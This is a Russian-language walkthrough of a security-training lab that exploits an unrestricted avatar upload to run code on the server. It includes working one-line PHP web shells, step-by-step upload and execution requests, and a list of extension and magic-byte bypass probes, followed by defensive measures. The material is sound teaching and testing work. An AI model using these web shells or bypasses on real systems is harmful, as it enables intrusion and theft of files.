<a id="goal"></a>

## 🎯 Цель

Эксплуатировать уязвимость unrestricted file upload, чтобы:

```text
1. Загрузить PHP веб-шелл на сервер через функцию загрузки аватара.
2. Определить путь, по которому сохраняются загруженные файлы.
3. Выполнить произвольные команды на сервере через веб-шелл.
4. Прочитать содержимое файла /home/carlos/secret и отправить ответ.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Загрузка файлов — одна из самых опасных функций веб-приложений. Если сервер сохраняет пользовательский файл и затем **исполняет/интерпретирует** его как код, загрузка превращается в **удалённое выполнение кода (RCE)**.

Типичный сценарий: сайт разрешает загрузку аватаров (изображений), но не проверяет **тип содержимого** файла. Атакующий загружает скрипт (например, PHP) с расширением `.php`, а затем обращается к нему по URL — сервер исполняет его как код.

Веб-шелл — минимальный скрипт, принимающий команду из запроса и выполняющий её на сервере:

```php
<?php echo system($_GET['cmd']); ?>
```

Одна строка кода, загруженная на сервер, — и атакующий получает «терминал» через URL-параметр.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Функция загрузки аватара не проверяет содержимое и расширение файла:

```text
Загрузка:  avatar.php (PHP-шелл)      → сохраняется как есть ✅
Доступ:    /files/avatars/avatar.php   → сервер исполняет PHP ✅
Результат: RCE через параметр ?cmd=
```

Цепочка:

```text
Загрузка шелла → найти путь к файлу → выполнить GET /files/avatars/avatar.php?cmd=...
```

---

<a id="webshell"></a>

## 🐚 Что такое веб-шелл

Веб-шелл — скрипт, который получает команду через HTTP-запрос и выполняет её через системный вызов:

```text
Запрос:    GET /files/avatars/shell.php?cmd=whoami
Сервер:    system("whoami")
Ответ:     carlos (или имя пользователя веб-сервера)
```

Эквивалент RCE: атакующему не нужен шелл-доступ (SSH/RDP) — достаточно HTTP.

Распространённые интерпретаторы и соответствующие расширения:

```text
PHP      → .php
Java     → .jsp
ASP.NET  → .aspx
Python   → не исполняется напрямую (нужен CGI/WSGI)
```

В этой лабе сервер работает под PHP.

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

PHP-шелл, сохраняемый как `avatar.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Вариант с выполнением произвольных команд (универсальнее для исследования):

```php
<?php echo system($_GET['cmd']); ?>
```

Оба варианта работают; для решения лабы достаточно первого — он напрямую читает нужный файл.

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функционала загрузки

1. Авторизоваться под тестовым пользователем (например, `wiener:peter`).
2. Перейти на страницу аккаунта — там есть форма загрузки аватара.
3. Загрузить обычное изображение и **изучить трафик в Burp**:

```text
POST /my-account/avatar
Content-Type: multipart/form-data

POST-параметр avatar: файл
```

4. Обратить внимание, как загруженный файл доступен в дальнейшем:

```text
<img src="/files/avatars/avatar.png">
```

Путь `/files/avatars/` — ключ к эксплуатации: файлы сохраняются в веб-доступную директорию.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Загрузка PHP-шелла

1. Создать локально файл `avatar.php` с содержимым:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Загрузить его через форму аватара.

3. Прочитать ответ сервера. Успешный признак:

```text
The file avatars/avatar.php has been uploaded.
```

Сервер **не проверяет** тип файла — PHP-скрипт сохранён как «аватар». Уязвимость unrestricted file upload подтверждена.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Определение пути к загруженному файлу

Из ответа загрузки и HTML страницы аккаунта собрать URL файла:

```text
Ответ:   The file avatars/avatar.php has been uploaded.
Страница: <img src="/files/avatars/avatar.png">
```

Итоговый URL шелла:

```text
/files/avatars/avatar.php
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Выполнение шелла и извлечение секрета

Отправить GET-запрос к шеллу (в Burp или браузере):

```text
GET /files/avatars/avatar.php
```

Сервер исполняет PHP и в ответе возвращает содержимое файла:

```text
Секретная строка из /home/carlos/secret
```

Отправить содержимое как решение лабы.

Лаборатория получает статус:

```text
Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Нет валидации типа файла

Сервер принимает любой файл, включая `.php`. Проверки расширения, MIME-типа и содержимого отсутствуют.

### 2. Файл сохраняется в веб-доступную директорию

`/files/avatars/` доступна по HTTP — загруженный скрипт можно вызвать напрямую по URL.

### 3. Сервер исполняет загруженный код

PHP-интерпретатор обрабатывает `.php` в директории загрузок. Содержимое файла превращается в выполняемый код.

### 4. Загруженный код выполняется с привилегиями веб-сервера

Шелл читает `/home/carlos/secret` — файл за пределами веб-директории. Это уже полноценный RCE, а не просто дефейс.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Найдя функцию загрузки, сразу отвечай на три вопроса:

```text
1. Куда сохраняется файл?  (веб-доступная директория?)
2. Что происходит с файлом дальше?  (исполняется? отдается как static?)
3. Какие проверки обходятся?  (расширение? MIME? содержимое?)
```

Пробы для определения режима валидации:

```text
shell.php            → базовый тест
shell.php.jpg        → двойное расширение
shell.jpg.php        → расширение в конце
SHELL.PHP            → регистр
shell.phtml          → альтернативное расширение PHP
GIF89a + PHP-код     → magic bytes в начале
```

Признак исполнимости: ответ сервера на GET-запрос к загруженному файлу — результат работы скрипта, а не его исходник.

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Не заметить путь к файлу

Путь `/files/avatars/` виден в HTML страницы аккаунта и в ответе загрузки. Без него шелл не вызвать.

### Ошибка 2. Загрузить шелл, но не открыть его

Загрузка сама по себе ничего не даёт — нужно отправить GET-запрос к файлу, чтобы сервер его исполнил.

### Ошибка 3. Ошибка в PHP-синтаксисе

Пропущенный `<?php` или `?>`, лишняя точка с запятой — файл сохранится, но не выполнится или вернёт ошибку.

### Ошибка 4. Неправильный путь к целевому файлу

`/home/carlos/secret` — абсолютный путь из условия лабы. Опечатка в пути = пустой ответ.

### Ошибка 5. Смотреть ответ как «текст файла» до выполнения

Если сервер отдаёт исходник шелла (не исполняет его) — это другой режим валидации/раздачи, и нужно искать другую точку исполнения.

<a id="defense"></a>

## 🛡 Защита

### 1. Валидация расширения и MIME

Проверять расширение по строгому whitelist (`jpg`, `jpeg`, `png`, `webp`) и проверять `Content-Type` — но не доверять только заголовку.

### 2. Проверка содержимого

Валидировать magic bytes / переоткрыть изображение через библиотеку обработки (image reprocessing) — это удаляет встроенные полезные нагрузки.

### 3. Использовать случайное имя файла

Генерировать имя на сервере (UUID), не сохранять пользовательское — затрудняет предсказание пути.

### 4. Хранить вне веб-корня

Сохранять загрузки в директорию, недоступную по HTTP, и раздавать их через отдельный эндпоинт/прокси.

### 5. Не исполнять код в директории загрузок

Отключить обработку скриптов в директории загрузок (nginx: `location /files/ { deny all; }` или отдача через static).

### 6. Ограничение прав процесса

Веб-сервер должен работать с минимальными правами — чтобы скомпрометированный код не мог читать чужие файлы.

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через классический **upload-to-RCE** сценарий:

```text
1. Отсутствие валидации → загружен PHP-шелл как «аватар»
2. Шелл сохранён в веб-доступную директорию
3. Запрос к файлу → сервер исполнил PHP
4. Прочитан /home/carlos/secret → RCE подтверждён
```

Главные выводы:

```text
Загрузка файла становится RCE, когда файл сохраняется в исполняемую веб-директорию.
```

```text
Проверка только расширения/типа недостаточна — проверять нужно содержимое и место хранения.
```

```text
Веб-шелл из одной строки PHP даёт атакующему терминал через HTTP.
```

```text
Защита: whitelist типов, проверка содержимого, хранение вне веб-корня, запрет исполнения.
```
